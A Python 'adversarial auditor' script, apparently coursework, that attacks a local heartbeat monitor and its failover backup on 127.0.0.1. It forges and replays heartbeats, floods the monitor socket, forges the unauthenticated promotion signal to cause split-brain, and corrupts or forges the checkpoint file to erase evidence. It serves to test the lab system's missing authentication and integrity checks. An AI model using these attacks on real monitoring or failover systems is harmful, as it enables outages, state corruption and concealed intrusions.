import argparse
import json
import socket
import threading
import time
from datetime import datetime

# Assuming the attacker has knowledge of the monitor's configuration and the heartbeat payload.
TARGET_HOST = "127.0.0.1"
TARGET_PORT = 50000
HEARTBEAT_PAYLOAD = "SoSecret"
BACKUP_PORT = 50001                     # port the backup listens on for the failover signal
ALERT_DATAGRAM = "YourCoworkerIsDead"   # the monitor's (unauthenticated) promotion signal
STATE_FILE = "state.json"               # the primary's checkpoint that the backup restores from


def log(msg):
    print(f"[audit {datetime.now().strftime('%H:%M:%S')}] {msg}")

# Heartbeat Spoofing
# The monitor never authenticates the sender, so as long as we know the payload, we can make valid-looking heartbeats.
# Kill the critical service, then run this attack to see the monitor still report "alive" because it cannot distinguish forged beats from real ones.

def attack_spoof(duration, interval_ms):
    log("ATTACK 1 (SPOOF): forging heartbeats to the monitor.")
    log("kill critical_process.py first, then watch the monitor still report the service as alive.")
    payload = HEARTBEAT_PAYLOAD.encode("utf-8")
    sent = 0
    deadline = time.time() + duration
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        while time.time() < deadline:
            s.sendto(payload, (TARGET_HOST, TARGET_PORT))
            sent += 1
            time.sleep(interval_ms / 1000.0)
    log(f"ATTACK 1 complete: sent {sent} forged beats over {duration}s. "
        f"If the monitor reported 'still alive' the whole time, spoofing "
        f"succeeded.")

# Replay / Tampering
# Attempt to bind to the heartbeat monitor's UDP port and capture a real beat. Then replay it to the monitor, which will accept it as valid because there's no authenitcation.
# If the monitor is bound to the port, the capture will fail and we will fall back to using a known payload shape. This only works because the beat doesn't change.
def _capture_one_beat(capture_timeout):
    log("ATTACK 2 (REPLAY): attempting to capture one real beat.")
    log("For a true capture, run this with the critical service UP and the monitor momentarily DOWN so we can bind the port and sniff a beat.")
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sniffer:
            sniffer.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sniffer.settimeout(capture_timeout)
            sniffer.bind((TARGET_HOST, TARGET_PORT))
            data, src = sniffer.recvfrom(1024)
            log(f"captured {len(data)} bytes from {src}: {data!r}")
            return data
    except OSError as e:
        # Port already held by the monitor, or nothing arrived in time.
        log(f"live capture unavailable ({e}); using known payload shape "
            f"instead -- The beat is a predictable constant.")
        return HEARTBEAT_PAYLOAD.encode("utf-8")


def attack_replay(capture_timeout, duration, interval_ms):
    beat = _capture_one_beat(capture_timeout)
    log("replaying the captured bytes verbatim; kill the service and watch "
        "the monitor stay green.")
    sent = 0
    deadline = time.time() + duration
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        while time.time() < deadline:
            s.sendto(beat, (TARGET_HOST, TARGET_PORT))
            sent += 1
            time.sleep(interval_ms / 1000.0)
    log(f"ATTACK 2 complete: replayed {sent} identical beats over {duration}s. "
        f"No freshness data in the payload means replay is indistinguishable "
        f"from a live beat.")

# Attack 3: Denial of Service on the monitor socket

def attack_flood(duration, workers):
    log(f"ATTACK 3 (FLOOD): {workers} worker(s) blasting the monitor socket "
        f"for {duration}s.")
    junk = b"X" * 1024
    counters = [0] * workers
    stop = threading.Event()

    def worker(idx):
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            dest = (TARGET_HOST, TARGET_PORT)
            while not stop.is_set():
                try:
                    s.sendto(junk, dest)
                    counters[idx] += 1
                except OSError:
                    pass

    threads = [threading.Thread(target=worker, args=(i,), daemon=True)
               for i in range(workers)]
    for t in threads:
        t.start()
    time.sleep(duration)
    stop.set()
    for t in threads:
        t.join(timeout=1.0)
    total = sum(counters)
    log(f"ATTACK 3 complete: sent ~{total} datagrams "
        f"(~{total // max(1, duration)}/s). Valid beats competing for the "
        f"monitor's single recv loop may have been dropped or delayed.")
    
# Induced False Failover/Split-Brain
# The monitor promotes the backup by sending ALERT_DATAGRAM to BACKUP_PORT, but the
# backup never authenticates that signal. An attacker who knows the signal can forge it directly, promoting
# the backup WHILE the primary is still alive -- producing two concurrent "primary"
# nodes (split-brain) that both emit heartbeats and both write the shared checkpoint,
# corrupting state. Run this with monitor + primary + backup all UP and healthy.

def attack_splitbrain(repeat, interval_ms):
    log("ATTACK 4 (SPLIT-BRAIN): forging the failover signal to the backup.")
    log(f"target = {TARGET_HOST}:{BACKUP_PORT}, signal = {ALERT_DATAGRAM!r}")
    log("run this with the PRIMARY still alive -- the backup should promote itself anyway.")
    payload = ALERT_DATAGRAM.encode("utf-8")
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        for i in range(repeat):
            s.sendto(payload, (TARGET_HOST, BACKUP_PORT))
            log(f"sent forged promotion signal #{i + 1}")
            time.sleep(interval_ms / 1000.0)
    log("ATTACK 4 complete. If the backup printed '[Service Restored]' while the "
        "primary is still running, there are now two live primaries writing the same "
        "checkpoint -- split-brain achieved with no network-level packet dropping.")

# Tampered Checkpoint
# Passive redundancy restores state from STATE_FILE on failover with no integrity check.
# An attacker with filesystem access can corrupt or forge the checkpoint:
# corrupt -> write invalid JSON. On failover load_state() hits JSONDecodeError and SILENTLY resets counters to 0/0 -- pre-crash state lost, no alert raised.
# inject  -> write attacker-chosen values. The backup restores them verbatim, so the adversary dictates post-failover state (e.g. zero the blocked-attempt
# count to erase evidence of an intrusion).

def attack_tamper(mode, valid, invalid):
    log(f"ATTACK 5 (TAMPER): corrupting checkpoint {STATE_FILE!r} (mode={mode}).")
    try:
        with open(STATE_FILE, "r", encoding="utf-8") as f:
            log(f"current checkpoint: {f.read().strip()}")
    except OSError as e:
        log(f"could not read current checkpoint ({e}); continuing anyway.")

    if mode == "corrupt":
        payload = "{ this is not valid json ::::"
    else:  # inject
        payload = json.dumps({"valid_attempts": valid, "invalid_attempts": invalid})

    try:
        with open(STATE_FILE, "w", encoding="utf-8") as f:
            f.write(payload)
    except OSError as e:
        log(f"FAILED to write tampered checkpoint: {e}")
        return

    log(f"wrote tampered checkpoint: {payload}")
    if mode == "corrupt":
        log("On the next failover the backup will fail to parse this and silently "
            "reset to valid=0/invalid=0 -- state lost, no alert raised.")
    else:
        log(f"On the next failover the backup will restore attacker-chosen state "
            f"(valid={valid}, invalid={invalid}) and trust it completely.")
    log("(restore the real checkpoint afterwards with: git checkout -- state.json)")

# --------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="Adversarial auditor "
                    "(targets 127.0.0.1:50000).")
    sub = parser.add_subparsers(dest="attack", required=True)

    p_spoof = sub.add_parser("spoof", help="forge heartbeats (Attack 1)")
    p_spoof.add_argument("--duration", type=int, default=30)
    p_spoof.add_argument("--interval", type=int, default=5,
                         help="ms between forged beats (default 5, matches T)")

    p_replay = sub.add_parser("replay", help="capture & replay (Attack 2)")
    p_replay.add_argument("--capture-timeout", type=int, default=5)
    p_replay.add_argument("--duration", type=int, default=30)
    p_replay.add_argument("--interval", type=int, default=5)

    p_flood = sub.add_parser("flood", help="DoS the monitor socket (Attack 3)")
    p_flood.add_argument("--duration", type=int, default=15)
    p_flood.add_argument("--workers", type=int, default=4)

    p_split = sub.add_parser(
        "splitbrain",
        help="forge the failover signal -> split-brain (Attack 4 / Part 2 Scenario 1)")
    p_split.add_argument("--repeat", type=int, default=1,
                         help="number of forged promotion signals to send (default 1)")
    p_split.add_argument("--interval", type=int, default=200,
                         help="ms between forged signals (default 200)")

    p_tamper = sub.add_parser(
        "tamper",
        help="corrupt/forge the checkpoint file (Attack 5 / Part 2 Scenario 2)")
    p_tamper.add_argument("--mode", choices=["corrupt", "inject"], default="corrupt",
                          help="corrupt=invalid JSON (state loss); "
                               "inject=attacker-chosen state (default corrupt)")
    p_tamper.add_argument("--valid", type=int, default=999999,
                          help="inject mode: forged valid_attempts (default 999999)")
    p_tamper.add_argument("--invalid", type=int, default=0,
                          help="inject mode: forged invalid_attempts "
                               "(default 0, hiding blocked attempts)")

    args = parser.parse_args()

    if args.attack == "spoof":
        attack_spoof(args.duration, args.interval)
    elif args.attack == "replay":
        attack_replay(args.capture_timeout, args.duration, args.interval)
    elif args.attack == "flood":
        attack_flood(args.duration, args.workers)
    elif args.attack == "splitbrain":
        attack_splitbrain(args.repeat, args.interval)
    elif args.attack == "tamper":
        attack_tamper(args.mode, args.valid, args.invalid)


if __name__ == "__main__":
    main()
